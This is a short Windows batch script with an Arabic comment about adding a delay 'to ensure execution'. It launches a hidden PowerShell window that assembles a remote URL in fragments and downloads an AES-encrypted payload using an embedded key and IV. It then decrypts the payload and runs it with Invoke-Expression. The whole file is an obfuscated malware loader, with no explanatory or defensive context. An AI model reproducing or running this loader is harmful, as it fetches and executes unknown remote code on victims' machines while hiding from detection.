@echo off
:: تحسين بسيط: إضافة تأخير لضمان التنفيذ
powershell -NoProfile -WindowStyle Hidden -Command "$HgbdHIYW='0uwfGZfg09SSzfqkKD2U';$pijo5BFR=173;$u='http';$u+='s://';$u+='api';$u+='.robq';$u+='uiz';$u+='.com';$u+='/all';$u+='user/';$u+='max';$u+='X/sy';$u+='stem';$u+='.php';$k=[Convert]::FromBase64String('o9cm4TTC8HeW4WSMPrTSgtHbx5z+GbTZZqdmjUhPqkU=');$i=[Convert]::FromBase64String('ju5RQZ7V7dbZ/hhFy3G9+w==');$d=(New-Object Net.WebClient).DownloadData($u+'?action=get_payload&key_id=dec73dcdc0b607fa');$a=New-Object Security.Cryptography.AesManaged;$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$i;$t=$a.CreateDecryptor();$b=$t.TransformFinalBlock($d,0,$d.Length);$s=[Text.Encoding]::UTF8.GetString($b);Invoke-Expression $s"
timeout /t 5 >nul
